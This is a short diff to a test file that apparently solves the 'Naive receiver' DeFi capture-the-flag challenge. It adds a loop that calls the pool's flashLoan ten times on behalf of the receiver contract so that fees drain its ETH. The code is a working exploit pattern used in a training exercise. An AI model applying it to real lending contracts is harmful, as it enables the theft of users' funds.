@@ -38,6 +38,11 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const ETH = await pool.ETH();
+        // Call flashloan for receiver contract to drain 10ETH from receiver contract
+        for (let i = 0; i < 10; i++) {
+            await pool.flashLoan(receiver.address, ETH, 1n * 10n ** 18n, "0x");
+        }
     });
 
     after(async function () {
